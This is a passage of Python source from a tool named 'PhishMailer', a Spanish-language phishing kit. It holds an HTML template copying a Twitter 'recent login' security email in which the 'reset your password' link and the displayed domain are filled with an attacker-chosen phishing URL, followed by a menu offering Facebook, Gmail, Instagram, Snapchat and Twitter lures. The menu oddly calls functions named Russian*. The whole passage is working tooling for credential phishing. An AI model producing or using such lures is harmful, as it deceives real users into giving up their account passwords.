style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr align="left;"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" cellpadding="0" cellspacing="0" border="0" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left;" class="m_7210276772504823937h2" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;line-height:32px;font-weight:bold;color:#292f33;text-align:left;text-decoration:none"> We noticed a recent login for your account <a href="" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#292f33;text-decoration:none" target="_blank">{}</a>. </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td width="30" style="width:30px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937margins"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937collapse" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Device</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Chrome on Android</td></tr><tr><td align="left" width="25%" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"><strong>Location</strong></td><td width="15" style="width:15px;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">Near {}, {}</td></tr></tbody></table> </td></tr></tbody></table> </td></tr><tr><td height="24" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this was you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Great! There's nothing else you need to do. </td></tr><tr><td height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937support" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:16px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> <strong>If this wasn’t you:</strong> </td></tr><tr><td height="6" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="left;" class="m_7210276772504823937body-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none"> Your account may have been compromised and you should take a few steps to make sure your account is secure. To start, <a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;border:none;text-decoration:none;font-weight:400;color:#1da1f2" target="_blank">reset your password now</a>. </td></tr><tr><td height="36" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" bgcolor="#F5F8FA" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td align="left" style="padding:0;margin:0;line-height:1px;font-size:1px"><table border="0" cellpadding="0" cellspacing="0" width="100%" style="padding:0;margin:0;line-height:1px;font-size:1px"><tbody><tr><td class="m_7210276772504823937edu-header" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:22px;text-align:left;color:#8899a6"> <strong>How do I know an email is from <span class="il">Twitter</span>?</strong> </td></tr><tr><td colspan="3" height="12" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td class="m_7210276772504823937edu-text" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:14px;line-height:19px;font-weight:400;text-align:left;color:#8899a6"> Links in this email will start with “<span class="m_7210276772504823937no-link"><a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none">https://</a></span>” and contain “<span class="m_7210276772504823937no-link"><a href="{}" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;color:#8899a6;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Ftwitter.com%252F%253Frefsrc%253Demail%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3D5810b2be86b6d2764512337d9cf3ea4d02812789%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1554&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNFX5GJTsk-lhQbDIpjXZSXB0zgDlQ"><span class="il">{}</span>{}</a></span>.” Your browser will also display a padlock icon to let you know a site is secure. </td></tr></tbody></table> </td></tr></tbody></table> </td><td width="24" class="m_7210276772504823937edu-margins" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="3" height="24" class="m_7210276772504823937edu-space" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table width="100%" align="center" cellpadding="0" cellspacing="0" border="0" class="m_7210276772504823937edu-module" style="padding:0;margin:0;line-height:1px;font-size:1px;background-color:#ffffff;border-radius:5px"><tbody><tr><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td><td height="1" style="line-height:1px;display:block;height:1px;background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937footer" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td height="36" style="height:36px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> <a href="https://support.twitter.com/articles/76036" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://support.twitter.com/articles/76036&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHUCzbUjXfmNAT0B7wamPYK6mFWjQ">Help</a> &nbsp;|&nbsp; <a href="https://twitter.com/i/redirect?url=https%3A%2F%2Fsupport.twitter.com%2Farticles%2F204820-fake-twitter-emails&amp;t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;sig=ee6d8d5439b23c101a3694be6e6989a2ffa94c79&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+1558" class="m_7210276772504823937small-copy" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:600;color:#1da1f2;text-align:left;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=en&amp;q=https://twitter.com/i/redirect?url%3Dhttps%253A%252F%252Fsupport.twitter.com%252Farticles%252F204820-fake-twitter-emails%26t%3D1%26cn%3DbG9naW5fbm90aWZpY2F0aW9u%26sig%3Dee6d8d5439b23c101a3694be6e6989a2ffa94c79%26iid%3Dd245d496e25743259b05c4aeaf0b44cf%26uid%3D2356568077%26nid%3D244%2B1558&amp;source=gmail&amp;ust=1488768499007000&amp;usg=AFQjCNHriReOKYKBFgrb1BXxDnBgMcj2aA">Email security tips</a> </span> </td></tr><tr><td height="12" style="height:12px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937small-copy" style="font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:12px;line-height:16px;font-weight:400;color:#8899a6;text-align:left;text-decoration:none"> This email was meant for {}</span> </td></tr><tr><td height="6" style="height:6px;line-height:1px;font-size:1px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"> <span class="m_7210276772504823937address"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;color:#8899a6;font-size:12px;padding:0px;margin:0px;font-weight:normal;line-height:12px"><span class="il">Twitter</span>, Inc. 1355 Market Street, Suite 900 San Francisco, CA 94103</a> </span> </td></tr><tr><td height="72" style="height:72px;padding:0;margin:0;line-height:1px;font-size:1px"></td></tr></tbody></table> </td></tr></tbody></table><div class="yj6qo"></div><div class="adL"></div></div>""".format(AccountName, City, Country, PhishUrl, PhishUrl, MustContain, Extension, TargetName))

	filename = input(start + " Ingrese el nombre en el archivo HTML para guardar: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(twitter)
	Html_file.close()
	print(alert + " Archivo HTML creado")

def MainSpanish():
	os.system("clear")
	print(start + "PhishMailer Beta en español")
	print(start + "Elija su opción: \n")
	print(numbering(1) + white + " FaceBook " + numbering(1))
	print(numbering(2) + white + " Gmail " + numbering(2))
	print(numbering(3) + white + " Instagram " + numbering(3))
	print(numbering(4) + white + " SnapChat " + numbering(4))
	print(numbering(5) + white + " Twitter " + numbering(5))
	print(numbering(99) + white + " Exit " + numbering(99))
	
	OptionPick = int(input(green + "\nroot@phishmailer/Español: " + white))
	
	if OptionPick == 1:
		os.system("clear")
		RussianFacebook()
		
	elif OptionPick == 2:
		os.system("clear")
		RussianGmailActivity()
		
	elif OptionPick == 3:
		os.system("clear")
		RussianInstagram()
		
	elif OptionPick == 4:
		os.system("clear")
		RussianSnapchatSimple()
		
	elif OptionPick == 5:
		os.system("clear")
		RussianTwitter()
	
	elif OptionPick == 99:
		os.system("clear")
		print("ok")
		sys.exit()
		
	else:
		print(alert + red + " Invalid")
		sys.exit()
	
	
	
	
	
	
	
	
